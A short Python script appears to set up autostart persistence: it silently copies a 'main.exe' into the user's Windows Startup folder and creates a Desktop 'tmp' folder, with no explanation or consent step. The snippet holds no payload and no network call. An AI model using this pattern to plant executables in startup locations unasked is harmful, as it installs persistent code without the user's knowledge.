
import os
import shutil
import pathlib

src_path = str(pathlib.Path(__file__).parent.resolve()) + "\\main.exe"
dst_path = f"C:{os.getenv('HOMEPATH')}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" + "\\main.exe"

base_path = f"C:{os.getenv('HOMEPATH')}\Desktop\\"
dir_name = 'tmp'
dir_path = base_path + dir_name

shutil.copy(src_path, dst_path)
    
try:
    os.mkdir(dir_path)
except FileExistsError:
    ...
